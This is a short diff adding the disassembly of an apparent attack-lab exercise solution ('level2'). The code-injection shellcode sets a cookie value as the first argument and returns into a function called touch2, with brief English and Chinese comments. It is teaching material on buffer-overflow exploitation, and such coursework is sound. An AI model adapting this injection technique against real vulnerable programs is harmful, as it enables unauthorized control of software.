@@ -1,0 +1,10 @@
+
+level2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 08 4a 2e 2a 	mov    $0x2a2e4a08,%rdi    //put cookie to the first parameter.
+   7:	68 52 20 40 00       	pushq  $0x402052
+   c:	c3                   	retq   //会直接返回到上面被亚茹栈中的返回地址，即touch2的地址.
